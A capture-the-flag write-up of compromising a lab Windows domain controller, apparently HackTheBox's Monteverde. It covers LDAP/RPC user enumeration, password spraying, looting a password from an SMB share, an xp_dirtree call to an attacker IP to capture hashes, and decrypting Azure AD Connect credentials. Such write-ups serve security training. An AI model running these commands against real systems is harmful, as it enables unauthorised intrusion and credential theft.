#Pwned
```IP
10.10.11.10
```
# Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 10.10.11.10 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-12-22 09:50:25Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## LDAP
```
ldapsearch -H ldap://10.10.10.172 -x -b "DC=MEGABANK,DC=LOCAL"
```
We retrieve some users:
```
smorgan
roleary
dgalanos
mhope
svc-netapp
svc-bexec
svc-ata
SABatchJobs
```
Further enumeration with this usernames as passwords gives us a positive in smb:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222110406.png?raw=true)
But it doesn't retrieve any share.
## RPC
With RPC we get similar results to LDAP
```
rpcclient -U '' 10.10.10.172 -N
enumdomusers
querydispinfo
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222110713.png?raw=true)
But it displays a extra user called `AAD_987d7f2f57d2` with description `Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTVERDE.`
We add it to our user list
## SMB
With all our usernames we can list again smb, and we will get SABatchJobs as the only hit
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222114916.png?raw=true)
Lets enumerate with:
```
smbclient //10.10.10.172/users$ --password='SABatchJobs' -U 'SABatchJobs' -c 'recurse;ls'
```
We will see an Azure.xml file that we can download and open, and will contain a password:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222115238.png?raw=true)
```
4n0therD4y@n0th3r$
```
Executing
```
nxc winrm 10.10.10.172 -u users.txt  -p '4n0therD4y@n0th3r$'
```
We get mhope user pwned!
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222115411.png?raw=true)
```
evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
```
# Exploitation

# PrivEsc

## Manual
```

```
Interesting software
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222115731.png?raw=true)
Let's try accessing mssql
```
sqlcmd -q 'select @@version;'
```
It seems like we have query execution:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222124743.png?raw=true)
We try xp_cmdshell command execution but we don't have permissions. With xp_dirtree and responder we get a hash though:
```
sqlcmd -q "xp_dirtree '\\10.10.14.17\test';"
```
It seems like we get a hash but it doesn't crack. So the next thing to try would be to enumerate tables.
There is a ADSync database that looks suspicious, but manually enumerating it is exhausting. If we google `ADSync mssql database` we will learn that it is a database part of the Microsoft Entra Could Sync, a sync client for Azure which helps users to set up and manage their sync preferences online. Including Password syncronization.
https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-install-existing-database
https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-azure-ad-connect-v2
And searching how to pentest this we get to the following blog: 
https://blog.xpnsec.com/azuread-connect-for-redteam/
Which suggests us to use `mms_management_agent` table to get some encrypted passwords
```
sqlcmd -q "USE ADSync;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;"
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222132514.png?raw=true)
When running the entire script located in the latter blog, we get a WinRM crash. So if we run each powershell command separately, we see that it is not connecting correctly to the MSSQL server:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222163115.png?raw=true)
A quick google search provides us with some alternative sintax to do the connection:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222163305.png?raw=true)
So now it is time to edit our script and transfer it once again to the target machine:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222163405.png?raw=true)
And finally we get the decrypted password!
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222163539.png?raw=true)
```
d0m@in4dminyeah!
```
And we get root:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241222163651.png?raw=true)

## Automated

### Peass
### Mimikatz

# Lateral Movement

